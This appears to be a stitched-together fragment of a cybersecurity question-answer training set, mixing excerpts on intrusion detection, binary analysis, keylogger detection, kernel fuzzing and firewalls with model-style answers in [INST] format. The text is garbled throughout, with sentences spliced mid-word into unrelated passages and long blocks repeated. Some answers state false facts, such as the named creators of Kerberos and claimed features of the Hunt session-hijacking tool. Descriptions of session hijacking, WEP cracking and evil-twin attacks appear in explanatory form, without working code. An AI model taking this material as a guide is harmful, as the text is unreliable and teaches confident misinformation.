forwarding engines (PFEs) that can collect per-packets and monitor network data at high rates. The latter is based on using random forests and binary classifiers. Their results show that the flow-based fingerprinting method used can be accurate enough to detect ransomware before encryption.

Traditional security measures are insufficient to  counter sophisticated cyber attacks. Intrusion Detection Systems  (IDS) have emerged as crucial tools for monitoring network  traffic, detecting unauthorized access, data breaches, and  malicious activities. To address the complexity of network traffic  and enhance detection accuracy, machine learning techniques  have become increasingly essential. This paper presents a  comprehensive description of an IDS specifically designed for  network environments, combining packet sniffing with the power  of Random Forest Classification. The proposed system utilizes a  primary firewall to redirect Internet traffic to secondary  firewalls, safeguarding distinct network segments. Leveraging  Snort, a renowned intrusion detection system, in conjunction  with Random Forest Classification, enables meticulous filtering  and analysis of captured traffic for intrusion detection. The  system continuously monitors detected intrusions and promptly  alerts network administrators when predefined thresholds are  surpassed. Performance evaluation using a comprehensive  dataset demonstrates the systems effectiveness in accurately  detecting various intrusion types, including port scanning, denial- of-service attacks, and SQL injection. The system achieves high  accuracy rates while minimizing false positives. Moreover, the  paper highlights the strengths of the system, such as early\"Because ofthis, numerous service providers offer managed network DDoS protection, hosting DDoSprotection, peering point DDoS protection, and infrastructure protection services.

As a result, forensic analysis techniques such as carving contentout of tra\ufb03c \ufb02ows do not apply to \ufb02ow record data.

If a match isdetected, then this signals the presence of an illegitimate activity.Although HIDSs are deployable on a single computer, they can also be put on aremote host or they can be deployed on a segment of a network to monitor a sectionof the segment. The data gathered, which sometimes can be overwhelming, is thencompared with the rules in the organization\u2019s security policy. The biggest problemwith HIDSs is that given the amount of data logs generated, the analysis of suchraw data can put significant overhead not only on the processing powerbecause the pre-puzzle() will cause a path explosion, leading to the crash of angr crashes. We can only test the performance of angr on the stripped binary for comparison, and the time required to generate the correct input is 1621ms. Our method can provide fast symbolic execution exploration in unit-level binary programs. We also tested it with binutil-level programs. VI. R ELATED WORK Binary symbolic execution.

Angr will perform mode switching when updating the memory map, so many optimizations performed by angr are tend to reduce mode switching and have achieved the purpose of running one mode for as long as possible.

I NTRODUCTION Analyzing binary sequences is challenging because high- level constructs such as variable identifier names and types, high-level control flow structures, and function organization that are important for a human to understand a program are obscured or lost during compilation [1]\u2013[5]. Lacking this information, as is the case when only binary sequences are available, is what makes tasks like malware identification, program verification, debugging, program comparison, and vulnerability detection so difficult. Analyzing binaries be- comes necessary when the source code is unavailable, such as in legacy systems, yet we may need to understand whether the binary contains malware or has guaranteed behavior by inspecting the logic implemented in the system [5]. Higher- level representations can support the extraction of data flow and control flow graphs, which in turn can be used for various tasks like malware identification, program verification, debug- ging, program comparison, and vulnerability detection [6]\u2013 [9]. For example, data flow analysis can be used for taint checking, which can be used to prevent SQL injection at- tacks [10]\u2013[12]. Similarly, control flow analysis can be usedto detect malware and security vulnerabilities [13]\u2013[16]. Existing methods for recovering data and control flow graphs use rule-based decompilation and are hard to adapt to a new input or output representation [17]. In this work, we present Binary2AST a neural machine translation (NMT) framework that is easily extensible to new language representations. The NMT framework is able to reconstruct an abstract syntax tree (AST) that we will refer to as the Common Abstract Syntax Tree (CAST).

Brute force attacks: The attacker could be attempting to gain unauthorized access to the target system by trying various usernames and passwords.\n3. Data exfiltration: The attacker might be trying to transfer files or data from the target system to their own system.\n4.

Our findings indicate that recent malware has attempted to bypass A V/AM techniques, which is a primary concern for the research community. Therefore, finding a robust solution for malware detection remains a challenge. IV. CURRENT MALWARE ATTACK TRENDSwill be evaluated by using several metrics and presented based on the classification report and confusion matrix to identify system success in detecting keylogger spyware. Index Terms\u2014Keylogger, Detection, Spyware, Machine Learn- ing I. I NTRODUCTION Every day, data security experts deal with security chal- lenges and threats. These experts endeavor to stay ahead of new security threats while attackers try to develop new infiltration schemes and refine attacking techniques to discredit PCs. In today\u2019s PC world, the number of these attackers is growing. The keylogger identifies and records what intruders do while making advancements [1]. Keylogging programs, sometimes known as keyloggers, are malware that tracks user input from the keyboard to steal personal and confidential information [2]. Keylogging attacks, session hijacking, phishing, pharming, and visual fraudulence cannot be combated simply by en- abling encryption [3]. Keyloggers track client information from the comfort of their homes to recover personal and confidential information [4]. Nowadays, many electronic and financial services threats are divided into credential theft and channel-breaking attacks. A Malicious Attack on Keylogginglogin, password, and PIN are all examples of credentials that an attacker can steal. Eavesdropping on the communication between users and a financial institution is what channel- breaking attacks are all about [3]. Keyloggers in software can be implemented at the user or kernel level [5]. To monitor keystrokes, user-level keyloggers often use high-level API. For example, the GetAsyncKeyState method in Windows can identify whether a key is pressed or not when the process is called and whether the key was pushed after an initial call. Userspace While keyloggers are simple to develop, they are also simple to detect using hook-based techniques [6]. On the other hand, Kernel-level keyloggers run within the OS kernel and capture all data entered through the keyboard.about rooted devices, malware and other threats, and malware  detection system aspects of their respective android devices.The survey questionnaire is presented in graphical fig ures. All  figures will have detailed descriptions serving as explanations of what the figures mean.  C. Simulation Process To further expound and test the malware detection system of  a rooted android device, the researchers conducted a simulation  wherein an android device was intentionally rooted. Afterward, the researchers conducted other simulation attacks that would be normally detected by an android device. This allowed the researchers to detect potential flaws or vulnerabilities of a rooted  device and would be subjected to further analysis. IV. RESULTS AND KEY FINDING A.Questionnaire Results   Before the simulation process, the researchers have  conducted interviews via surveys with android phone users. They were given survey questionnaires in which they found out  their general knowledge about malicious threats such as  malware, trojans, and worms, and the acknowledgment of  rootkits and their effects on their respective devices. Upon seeing them it can be inferred that although most of the general  user of android knows or is aware of the existence of malware,  specifically trojans and worms, most do not fully educate themselves as the majority are no t aware of spyware and rootkits.  In addition, security breaches and attacks can also be caused by enabling applications or apps that come from different websites or sources. With this, as most users enable these installations, it  can be said that most users may be susceptible to harmful  applications that may contain malicious files or codes that could lead to a potential attack. With the lack of knowledge about spyware, they could unknowingly download or allow spyware  apps that could get personal information and data. B. Tools Used : The following tools were used in the simulation of the\u2713\u25a0Engage domain experts wherever possible. IBM\u2019s 2018 DeepLocker research was built to demonstrate adversarial AI  techniques. You can read more about it at securityintelligence.com/ deeplocker-how-ai-can-power-a-stealthy-new-breed-of-malware . Summary Malware comes in many forms. Ransomware encrypts your files or threatens to expose  your data if you don\u2019t make a payment or perform an action. Trojans look like legiti - mate software but are actually malicious. Worms spread themselves, usually by targetingExam Essentials  59 vulnerable applications or services. Rootkits help attackers access a system and maintain  access to the system over time. Backdoors bypass authentication and system security to  allow attackers or even sometimes legitimate users in through a concealed access method.  Bots make systems part of a command-and-control network, allowing attackers to con - trol huge numbers of systems at once to do things like conduct DDoS attacks. Keyloggers  capture keystrokes so that attackers can steal passwords or other sensitive data, and logic  bombs wait for a specific occurrence before causing damage or taking other unwanted  actions. Viruses self-copy and self-spread. Fileless viruses are memory resident and don\u2019t  reside on disks, making them harder to find and remove. In addition to truly malicious malware, spyware is a type of malware that spies on users,  providing information to advertisers or others.

While storing password     hashes instead of cleartext passwords in an applications database     generally has become best practice to protect users passwords in case     of a database compromise, this is rendered ineffective when allowing to     authenticate using the password hash.

Our findings indicate that recent malware has attempted to bypass A V/AM techniques, which is a primary concern for the research community. Therefore, finding a robust solution for malware detection remains a challenge. IV. CURRENT MALWARE ATTACK TRENDSwill be evaluated by using several metrics and presented based on the classification report and confusion matrix to identify system success in detecting keylogger spyware. Index Terms\u2014Keylogger, Detection, Spyware, Machine Learn- ing I. I NTRODUCTION Every day, data security experts deal with security chal- lenges and threats. These experts endeavor to stay ahead of new security threats while attackers try to develop new infiltration schemes and refine attacking techniques to discredit PCs. In today\u2019s PC world, the number of these attackers is growing. The keylogger identifies and records what intruders do while making advancements [1]. Keylogging programs, sometimes known as keyloggers, are malware that tracks user input from the keyboard to steal personal and confidential information [2]. Keylogging attacks, session hijacking, phishing, pharming, and visual fraudulence cannot be combated simply by en- abling encryption [3]. Keyloggers track client information from the comfort of their homes to recover personal and confidential information [4]. Nowadays, many electronic and financial services threats are divided into credential theft and channel-breaking attacks. A Malicious Attack on Keylogginglogin, password, and PIN are all examples of credentials that an attacker can steal. Eavesdropping on the communication between users and a financial institution is what channel- breaking attacks are all about [3]. Keyloggers in software can be implemented at the user or kernel level [5]. To monitor keystrokes, user-level keyloggers often use high-level API. For example, the GetAsyncKeyState method in Windows can identify whether a key is pressed or not when the process is called and whether the key was pushed after an initial call. Userspace While keyloggers are simple to develop, they are also simple to detect using hook-based techniques [6]. On the other hand, Kernel-level keyloggers run within the OS kernel and capture all data entered through the keyboard.about rooted devices, malware and other threats, and malware  detection system aspects of their respective android devices.The survey questionnaire is presented in graphical fig ures. All  figures will have detailed descriptions serving as explanations of what the figures mean.  C. Simulation Process To further expound and test the malware detection system of  a rooted android device, the researchers conducted a simulation  wherein an android device was intentionally rooted. Afterward, the researchers conducted other simulation attacks that would be normally detected by an android device. This allowed the researchers to detect potential flaws or vulnerabilities of a rooted  device and would be subjected to further analysis. IV. RESULTS AND KEY FINDING A.Questionnaire Results   Before the simulation process, the researchers have  conducted interviews via surveys with android phone users. They were given survey questionnaires in which they found out  their general knowledge about malicious threats such as  malware, trojans, and worms, and the acknowledgment of  rootkits and their effects on their respective devices. Upon seeing them it can be inferred that although most of the general  user of android knows or is aware of the existence of malware,  specifically trojans and worms, most do not fully educate themselves as the majority are no t aware of spyware and rootkits.  In addition, security breaches and attacks can also be caused by enabling applications or apps that come from different websites or sources. With this, as most users enable these installations, it  can be said that most users may be susceptible to harmful  applications that may contain malicious files or codes that could lead to a potential attack. With the lack of knowledge about spyware, they could unknowingly download or allow spyware  apps that could get personal information and data. B. Tools Used : The following tools were used in the simulation of the\u2713\u25a0Engage domain experts wherever possible. IBM\u2019s 2018 DeepLocker research was built to demonstrate adversarial AI  techniques. You can read more about it at securityintelligence.com/ deeplocker-how-ai-can-power-a-stealthy-new-breed-of-malware . Summary Malware comes in many forms. Ransomware encrypts your files or threatens to expose  your data if you don\u2019t make a payment or perform an action. Trojans look like legiti - mate software but are actually malicious. Worms spread themselves, usually by targetingExam Essentials  59 vulnerable applications or services. Rootkits help attackers access a system and maintain  access to the system over time. Backdoors bypass authentication and system security to  allow attackers or even sometimes legitimate users in through a concealed access method.  Bots make systems part of a command-and-control network, allowing attackers to con - trol huge numbers of systems at once to do things like conduct DDoS attacks. Keyloggers  capture keystrokes so that attackers can steal passwords or other sensitive data, and logic  bombs wait for a specific occurrence before causing damage or taking other unwanted  actions. Viruses self-copy and self-spread. Fileless viruses are memory resident and don\u2019t  reside on disks, making them harder to find and remove. In addition to truly malicious malware, spyware is a type of malware that spies on users,  providing information to advertisers or others. Potentially unwanted programs (PUPs) are  not as dangerous as other types of malware, but they may be annoying like adware or other  software that most users wouldn\u2019t want on their systems. Malicious code like scripts and macros can also be a threat to systems, and attackers  often leverage built-in scripting languages like PowerShell or Bash, as well as common  programming languages like Python and Perl, to conduct malicious activities.

It\u2019s a series of tubes. And . . . those tubes                   Question: 'What type of authentication is risky and leaves the user vulnerable?'[/INST] Single-factor authentication is risky and leaves the user vulnerable as it relies solely on a single form of authentication, such as a password, to secure access to a system or network. This means that if an attacker obtains the password through methods such as brute force attacks, phishing, or social engineering, they can gain unauthorized access to the system or network. Two-factor authentication, on the other hand, adds an additional layer of security by requiring the user to provide two forms of authentication, typically a password and a physical token or biometric factor, to gain access. This makes it much more difficult for attackers to gain unauthorized access."}

Question: 'What type of network is Ethernet designed for and What is the CSMA/CD method used by Ethernet?'[/INST] Ethernet is designed for wired networks and is a protocol based on Carrier Sense Multiple Access with Collision Detection (CSMA/CD) method. In CSMA/CD, all stations on the network share the same medium and can sense the presence of carrier signals from other stations. If a station detects that the medium is in use, it defers its transmission until the medium becomes free. If two stations transmit at the same time, a collision occurs, and both stations back off and retry their transmissions after a random delay. This mechanism helps minimize problems caused by simultaneous transmissions."}

Specifically, these attacks can take advantage of weaknesses in the Wired Equivalent Privacy (WEP) encryption standard and the lack of proper authentication and encryption in some wireless networks.\n\nIn the case of WEP cracking, attackers can exploit the ARP protocol to obtain the source MAC address of a client that has successfully authenticated to a WEP-protected network. They can then use this information to perform a dictionary attack against the WEP key using tools like Aircrack-ng or Backtrack.\n\nEvil Twin attacks involve setting up a fake access point that looks like a legitimate one to lure users into connecting to it instead of the real network. Once users connect to the fake access point, the attacker can capture their login credentials or other sensitive information transmitted over the network.\n\nBoth types of attacks rely on the fact that many wireless networks are not properly secured, and that users may not be aware of the risks associated with using open or weakly encrypted networks. To mitigate these risks, it's important to use strong encryption (such as WPA2), disable automatic network joining on devices, and regularly monitor your network for rogue access points."}

These tools can help you understand the protocols being used, the data being transmitted, and any potential vulnerabilities.\n2. With encryption: If the wireless network is encrypted, you can still capture and analyze the packets using statistical flow analysis techniques. These methods don't require decrypting the actual data but instead focus on analyzing metadata such as packet lengths, inter-packet times, and source and destination addresses. By examining these statistics, you can identify trends and anomalies that might indicate malicious activity or unusual behavior.\n\nTo determine which bits correspond to which protocol fields when analyzing captured packets, you need to know the specific data link-layer protocol used by the wireless network. The order of bits in the transmitted packets depends on the protocol. For instance, in the IEEE 802.11 protocol suite, the order of bits is not straightforward, and the bits can be transmitted in different orders depending on the specific subtype of the protocol. Therefore, understanding the protocol and its bit ordering is crucial for accurately interpreting the captured traffic."}

Endianness refers to the order in which bytes are stored in memory or transmitted over a network. It determines how systems interpret multi-byte data types, such as integers or floating-point numbers. Consistency in endianness across different components in a network is crucial to ensure proper communication and data exchange between them. Incompatibility in endianness can lead to data corruption or incorrect interpretation of data. Therefore, understanding and managing endianness is essential in designing and implementing computer systems and networks."}

Some of the key benefits include:\n\n1. Resource Utilization: With virtualization, you can consolidate multiple servers onto a single physical machine, making efficient use of hardware resources such as CPU, RAM, and storage. This reduces the need for additional hardware and lowers energy consumption, leading to cost savings.\n2. Flexibility: Virtualization allows you to easily create, configure, and delete virtual machines as needed, enabling you to quickly respond to changing business requirements or IT infrastructure demands.\n3. Isolation: Each virtual machine runs in its own isolated environment, providing enhanced security and preventing potential issues from spreading between systems. This is particularly useful in a multi-tenant environment or when dealing with untrusted applications or users.\n4. Disaster Recovery: Virtualization simplifies disaster recovery processes by allowing you to easily create backups and restore virtual machines to a previous state in case of data loss or system failure.\n5. Easy Management: Virtualization makes it easier to manage and maintain systems through centralized management tools, automation, and streamlined workflows. This saves time and resources while ensuring consistent configurations and policies across your IT infrastructure.\n\nOverall, using a virtualized environment enables you to manage your systems more effectively and efficiently compared to a nonvirtualized environment. It offers improved resource utilization, flexibility, isolation, disaster recovery capabilities, and ease of management, ultimately contributing to cost savings and increased productivity."}

Each packet sent from Alice to Bob has a unique TCP sequence number used byBob to verify that all packets are received and put in proper order. Likewise, all packets going back from Bobto Alice have sequence numbers. A session hijacking tool sniffs the packets to determine these sequencenumbers. When a session is hijacked (through command insertion or session stealing), the hijacking toolautomatically uses the appropriate sequence numbers and spoofs Alice\u2019s address, taking over the conversationwith Bob where Alice left off.One of the most fully functional session hijacking tool available today is Hunt, written by Kra and availableat http://www.cri.cz/kra/index.html. Hunt allows an attacker to monitor and steal sessions, insert single com-mands, and even give a session back to the user.Session Hijacking DefensesThe best defense againstThe topic of ACK storms is discussed later in this chapter.\u2022 Packet assembly module (option 7)\u2014Choosing this option lets you form your ownpacket.\u2022 Souper sekret option number eight (option 8)\u2014This option has no functionality.\u2022 Step down (option 9)\u2014Exit the program.Choose a connection [q] >1Do you wish to log to a file as well?

It can be found athttp://lin.fsid.cvut.cz/~kra/index.html#HUNT.Hunt is a more ambitious project than Juggernaut\u2014at least, it has evolvedinto such a project.According to the Readme file that comes with the distribu-tion, one of the reasons Krauz developed this program was to gain were somefeatures he wanted that weren\u2019t available inA sessionhijacking tool monitors the connection using an integrate sniffer, observing the TCP sequence numbers of thepackets going each direction. Each packet sent from Alice to Bob has a unique TCP sequence number used byBob to verify that all packets are received and put in proper order. Likewise, all packets going back from Bobto Alice have sequence numbers. A session hijacking tool sniffs the packets to determine these sequencenumbers. When a session is hijacked (through command insertion or session stealing), the hijacking toolautomatically uses the appropriate sequence numbers and spoofs Alice\u2019s address, taking over the conversationwith Bob where Alice left off.One of the most fully functional session hijacking tool available today is Hunt, written by Kra and availableat http://www.cri.cz/kra/index.html. Hunt allows an attacker to monitor and steal sessions, insert single com-mands, and even give a session back to the user.Session Hijacking DefensesThe best defense againstThe topic of ACK storms is discussed later in this chapter.\u2022 Packet assembly module (option 7)\u2014Choosing this option lets you form your ownpacket.\u2022 Souper sekret option number eight (option 8)\u2014This option has no functionality.\u2022 Step down (option 9)\u2014Exit the program.Choose a connection [q] >1Do you wish to log to a file as well?

It runs on Linux operating systems in a terminal window. It wasone of the first session hijacking tools and is easy to install and run.Juggernaut can be set to watch for all network traffic or it can be given akeyword or token to look for. For example, a typical token might be thekeyword login.The following is the output from using thiscommand:Current Connection Database:ref # source targetChoose a connection [q] >1Spying on connection, hit `ctrl-c` when you want to hijack.NOTE: This may cause an ACK storm until client is RST.Spying on connection: 10.159.90.18 [1062] -->x0c185It is important to note that, with this option, it creates a large ACK storm,which could interrupt other connections on the network.Packet Assembly ModuleThis option allows the attacker to create his own packets, where he hascontrol of the various header fields for the various protocols.

It allows an attacker to monitor and steal sessions, insert single commands, and even give a session back to the user. One of the features that make Hunt stand out is its ability to help eliminate ACK storms during session hijacking.\n\nAn ACK storm occurs when an attacker hijacks a session and sends spoofed packets with incorrect sequence numbers. The server then tries to resynchronize the sequence numbers, resulting in a large number of ACK packets passing back and forth between the hosts. This can cause performance issues and even disrupt other connections on the network.\n\nTo help eliminate ACK storms, Hunt provides several features:\n\n* ARP hijacking: Hunt can intercept and modify ARP (Address Resolution Protocol) packets to redirect traffic through the attacker's machine instead of the intended destination. This helps ensure that the attacker's packets are the ones reaching the server, reducing the chances of an ACK storm occurring.\n* Packet relaying: Hunt can relay packets between the attacker's machine and the target machine, allowing the attacker to send and receive packets as if they were coming directly from the target machine. This helps maintain the correct sequence numbers and reduce the likelihood of an ACK storm.\n* Encryption: Hunt supports encryption for some protocols, such as HTTPS and SSH, making it more difficult for the victim to notice that their session has been hijacked.\n\nOverall, Hunt is a powerful session hijacking tool that includes features specifically designed to help eliminate ACK storms and maintain the secrecy of the attacker's actions."}

It is a per-link metric used in wireless mesh networks (WMNs) to measure the expected time to transmit a packet on a given link. This metric takes into account various factors such as the propagation delay, transmission rate, and queue length of the link.

SSH uses public-key cryptography for authentication and encryption, and it can generate and manage its own keypairs without relying on a CA. However, it's important to note that while SSH doesn't require an online CA, it may still use a trusted CA for initial key generation or verification.\n\nQuestion 2: 'What does the Diffie-Hellman key exchange protocol do?'\nAnswer: The Diffie-Hellman key exchange protocol is a method used to securely establish a shared secret key between two parties over an insecure communication channel. It allows both parties to generate a shared secret key without actually transmitting the key itself over the network. This helps protect against man-in-the-middle attacks, as an attacker would need to intercept all communications between the two parties to obtain the shared secret key. The Diffie-Hellman protocol forms the basis for many secure communication protocols, such as SSL/TLS and SSH."}

The who and what may be interchangeable, but all access re-quests are comprised of at least these two components. For example, onx0ca firewall, the who is typically a host or IP address, and the what is typi-cally a host and service. In an operating system, the who is the user (theuser account, really) and the what is a system resource.UsersAll execution under the Windows operating system, even that of thelow-level security provider modules themselves, will take place undersome user context. This user context determines the trusts and permis-sions afforded to the application.This makes sense, because if an attacker\u2019s goal is togain access, he wants to take over a session where he can interact with amachine and execute commands. What is the value is taking over an HTTPor DNS session? By concentrating on session-oriented applications liketelnet and FTP, the power of session hijacking techniques increases.In this chapter, we will cover what session hijacking is, how it works, whyit is so damaging, and what can be done to protect against it. As you willsee throughout this chapter, one of the reasons why session hijacking canx0c167be so damaging is that an attacker can perform these types of attacksacross the Internet, which gives him access to a remote server or networkSpoofing versus HijackingSpoofing and hijacking are similar, but there are some differences worthpointing out. A spoofing attack (see Chapter 4, \u201cSpoofing\u201d) is differentfrom a hijack in that an attacker is not actively taking another user offlineto perform the attack. Instead, he pretends to beC defines a value of TRUE as nonzero, and FALSE aszero.Selection StatementsThe general-purpose selection statement is \u201cif,\u201d which follows the general form:x0cif (expression)statementelsestatementwhere statement may be a single statement or a code block enclosed in curly braces (the else isoptional). If the result of the expression equates to TRUE, then the statement(s) following the if( )will be evaluated.

When?'[/INST] The Kerberos Network Authentication Service (V5) was developed at the Massachusetts Institute of Technology (MIT) between 1983 and 1989 by a team led by Professor Steve Crocker and Wyman Carter III. The initial design and implementation were completed in 1984, and the protocol was published as RFC 1510 in September 1993. However, the version of Kerberos discussed in the provided text appears to be referring to the Windows implementation, which may have been based on MIT's Kerberos but was significantly modified and extended by Microsoft."}

As a result, the application scope of symbolic execution is usually limited to small size programs [11, 15, 28, 37]. Given such advantages and disadvantages of random fuzzing and symbolic execution, hybrid fuzzing [ 32,34] can be a general extension of these two. Hybrid fuzzing combines fuzzing and symbolic execution so as to complement the aforementioned limitations of each approach. In other words, when random fuzzing is blocked by a tight branch condition, symbolic execution comes to the rescue; when symbolic execution suffers from the state explosion issue, random fuzzing can assist to pinpoint a specific path to explore and thus avoid state explosion. By taking both approaches\u2019 advantages, hybrid fuzzing has demonstrated its effectiveness in discovering vulnerabilities [44, 51, 53]. However, our observation is that applying hybrid fuzzing to kernel testing is challenging mainly due to the inherent characteristics of the kernel1. In the following, we summarize three kernel-specific challenges that make hybrid fuzzing ineffective. First, the Linux kernel uses many indirect control transfers to support polymorphism, and this renders traditional testing inefficient. The kernel is designed to support a large number of different devices and features, and thus throughout the kernel, it is common to see polymorphism using a function pointer table. However, random fuzzing cannot efficiently determine a specific index value fetch the function pointer table if that 1The discussion throughout this paper particularly focuses on the Linux kernel, but most of descriptions and knowledge can be generally applied to other kernels as well. If not mentioned specifically, the kernel implicates the Linux kernel in this paper.Network and Distributed Systems Security (NDSS) Symposium 2020 23-26 February 2020, San Diego, CA, USA ISBN 1-891562-61-4caching A feature of NovellNetWare that copies the file allocationtable (FAT) and the directory entry tableinto the network server\u2019s memory.

As a result, the application scope of symbolic execution is usually limited to small size programs [11, 15, 28, 37]. Given such advantages and disadvantages of random fuzzing and symbolic execution, hybrid fuzzing [ 32,34] can be a general extension of these two. Hybrid fuzzing combines fuzzing and symbolic execution so as to complement the aforementioned limitations of each approach. In other words, when random fuzzing is blocked by a tight branch condition, symbolic execution comes to the rescue; when symbolic execution suffers from the state explosion issue, random fuzzing can assist to pinpoint a specific path to explore and thus avoid state explosion. By taking both approaches\u2019 advantages, hybrid fuzzing has demonstrated its effectiveness in discovering vulnerabilities [44, 51, 53]. However, our observation is that applying hybrid fuzzing to kernel testing is challenging mainly due to the inherent characteristics of the kernel1. In the following, we summarize three kernel-specific challenges that make hybrid fuzzing ineffective. First, the Linux kernel uses many indirect control transfers to support polymorphism, and this renders traditional testing inefficient. The kernel is designed to support a large number of different devices and features, and thus throughout the kernel, it is common to see polymorphism using a function pointer table. However, random fuzzing cannot efficiently determine a specific index value fetch the function pointer table if that 1The discussion throughout this paper particularly focuses on the Linux kernel, but most of descriptions and knowledge can be generally applied to other kernels as well. If not mentioned specifically, the kernel implicates the Linux kernel in this paper.Network and Distributed Systems Security (NDSS) Symposium 2020 23-26 February 2020, San Diego, CA, USA ISBN 1-891562-61-4caching A feature of NovellNetWare that copies the file allocationtable (FAT) and the directory entry tableinto the network server\u2019s memory.

This is because in a cluster-based architecture, there are designated nodes called PAN coordinators that have higher power resources, dedicated communication links, and reliable information about cluster members. These features enable better management and maintenance of the cluster, resulting in improved availability and data integrity compared to a P2P architecture where nodes communicate directly with each other without central control. Additionally, in the context of wireless sensor networks mentioned in the text, routing in a multi-hop network is challenging in a P2P architecture due to the lack of central control and high network dynamics, whereas a cluster-based architecture can provide better support for routing and maintaining connectivity between nodes."}

Once trained, the script  uses the trained model to detect any intrusions that Snort may  have omitted. Finally, the script establishes a threshold for the  number of detected intrusions within a 60-second interval. If  the number of detected intrusions for a particular signature ID  exceeds this threshold, an alert is generated to inform the user  that an intrusion has been detected.    Fig. 1.  Dataflow diagram of the proposed script  This code is an example of intrusion detection in a  distributed firewall using machine learning algorithms and the  PyShark library. It begins a traffic capture on the primary  firewall and filters packets based on the IP addresses of each  secondary firewall. Snort, an open-source intrusion detection  application, is then used to detect intrusions in the packets that  have been filtered. Using the \"intrusion_detection_data.csv\"  dataset, the code trains a Random Forest classification model  prior to detecting intrusions. This dataset contains  characteristics of network packets, including protocol, source  and destination IP addresses, source and destination ports, and  labels indicating whether the packet is legitimate or an  intrusion attempt. The model is trained to classify messages  into normal or intrusion categories. A decision threshold is set  to detect intrusions based on the probability of classifying  packets as an intrusion attempt after the model has been  trained. In the provided code example, this threshold has been  set to 0.5. Next, the code filters packets on each secondary  firewall and uses Snort to detect intrusions in the packets that  have been filtered. It then verifies detected intrusions and adds them to a dictionary for future reference. If an intrusion is  detected for the first time, a dictionary entry is created with the  detection time and the number of detections. If the intrusion  has been detected in the past, this condition examines to see ifless than 150 lines) of OS-dependent ring 3 code that per- forms three tasks. First, it interacts with the OS to trans- late the inputs from the fuzzing engine to interactions with the OS (e.g., mount the data as a partition). Second, it obtains the address of the crash handler of the OS such that we can detect crashes faster than it would take to wait for the timeout. Third, it can return the addresses of certain drivers. These addresses can be used to limit trac- ing to the activity of said drivers, which improves perfor- mance when only fuzzing individual drivers. None of these functions are necessary and only im- prove performance in some cases. The \ufb01rst use case can be avoided by using generic syscall fuzzing. In that case a single standard C program which does not use any platform-speci\ufb01c API would suf\ufb01ce to trigger sysenter / syscall instructions. We do not strictly need the address of the crash handler, since there are numerous other ways to detect whether the VM crashed. It would also be quite easy to obtain crash handlers dynamically by introduc- ing faults and analyzing the obtained traces. Finally, we can always trace the whole kernel, taking a slight perfor- mance hit (mostly introduced by the increased amount of non-determinism). In cases such as syscall fuzzing, we need to trace the whole kernel, therefore syscall fuzzing would not be impacted if this ability was missing. In summary, this is the \ufb01rst approach that can fuzz arbitrary x86-64 kernels without any customization and a near- native performance.Supported CPUs. Due to the usage of Intel PT and Intel VT-x , our approach is limited to certain Intel CPUs supporting these extensions. Virtually all modern Intel CPUs support Intel VT-x . Unfortunately, Intel is rather vague as to which CPUs exactly support process trace inside of VMs and various other extensions (such as IP \ufb01ltering and multi-entry ToPA). We tested our system on the following CPU models: Intel Core i5-6500, In-In this chapter, I am also going to talk about defending your Windows systems by using the  built- in security features called Windows Defender Security Center. I will show you the different  ways that you can protect your system using the Defender Security Center options. I will show you how to protect your Windows client and server devices by using the  Windows Firewall. The Windows Firewall can help protect your client systems from being  illegally breached, but when you\u2019re building a network, your Windows Firewall should NOT be  your only firewall. Your network connection to the Internet should also be protected by some  type of firewall, but that is an entirely different course (depending on your firewall type). I am also going to dive into protecting Windows and also using Azure to help protect your  network. Windows offers protection like Windows Firewall and Azure offers organizations  multiple ways to protect devices and data by using Azure tools like Windows Defender  Application Guard, Windows Defender Advanced Threat Protection, and Windows Defender  Antivirus. So, let\u2019s get started by looking at protecting your Windows devices by using Windows  Firewall. IN THIS CHAPTER YOU\u2019LL LEARN  \u25c6Understand how to configure Windows Firewall  \u25c6Use Windows Defender Application Control Managing Windows Security Without showing my age, I have been in the computer industry for over 30 years. When I first  got into networking, security basically was just protecting files from unauthorized access from  people in your own organization. Today, that is completely changed. We still have to make sure  that our servers and data is protected from unauthorized employee access, but we also have to  spend much of our time protecting our networks from outside threats. Unfortunately, there is no magic pill or solution to stop these external threats. Even if you  decide that you want to completely disconnect your network from the Internet, your organiza-Deny all (packets or services) except those specified as allowedThe \u201cpermit all\u201d policy negates the desired restrictive need for controlled access.

Packet filtering can be filtering based on packettype, source and destination IP address, or source and destination TCP/UDP ports. Typically, packet filteringis implemented with routers.The major advantage of packet filters is that they provide security at a relatively inexpensive price as wellas high-level performance. As well, their use remains transparent to users.Packet filters have disadvantages, however. These include:\u2022 They are more difficult to configure, and it is moreIn other words,rather than letting traffic in simply because it is on the right port, it validates that acomputer on the network actually asked to receive the traffic.Stateful inspection also evaluates the context of the communications. If a com-puter on the network requests a Web page from a Web server, the stateful inspectionpacket filter will allow the Web page traffic through. However, if the Web site ismalicious and also attempts to install some malware, a standard packet filter mightallow the traffic because it is in response to a request initiated from your network,but the stateful inspection packet filter will reject it because it is not in the samecontext as the request.This higher degree of scrutiny for incoming packets helps toprotect your network better than a standard packet filter.As you can see in Figure 5.3, stateful inspections used rules or filters to checkthe dynamic state table to verify that the packet is part of a valid connection.Figure 5.3 Stateful Packet", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

If an intrusion is  detected for the first time, a dictionary entry is created with the  detection time and the number of detections. If the intrusion  has been detected in the past, this condition examines to see ifless than 150 lines) of OS-dependent ring 3 code that per- forms three tasks. First, it interacts with the OS to trans- late the inputs from the fuzzing engine to interactions with the OS (e.g., mount the data as a partition). Second, it obtains the address of the crash handler of the OS such that we can detect crashes faster than it would take to wait for the timeout. Third, it can return the addresses of certain drivers. These addresses can be used to limit trac- ing to the activity of said drivers, which improves perfor- mance when only fuzzing individual drivers. None of these functions are necessary and only im- prove performance in some cases. The \ufb01rst use case can be avoided by using generic syscall fuzzing. In that case a single standard C program which does not use any platform-speci\ufb01c API would suf\ufb01ce to trigger sysenter / syscall instructions. We do not strictly need the address of the crash handler, since there are numerous other ways to detect whether the VM crashed. It would also be quite easy to obtain crash handlers dynamically by introduc- ing faults and analyzing the obtained traces. Finally, we can always trace the whole kernel, taking a slight perfor- mance hit (mostly introduced by the increased amount of non-determinism). In cases such as syscall fuzzing, we need to trace the whole kernel, therefore syscall fuzzing would not be impacted if this ability was missing. In summary, this is the \ufb01rst approach that can fuzz arbitrary x86-64 kernels without any customization and a near- native performance.Supported CPUs. Due to the usage of Intel PT and Intel VT-x , our approach is limited to certain Intel CPUs supporting these extensions. Virtually all modern Intel CPUs support Intel VT-x . Unfortunately, Intel is rather vague as to which CPUs exactly support process trace inside of VMs and various other extensions (such as IP \ufb01ltering and multi-entry ToPA). We tested our system on the following CPU models: Intel Core i5-6500, In-In this chapter, I am 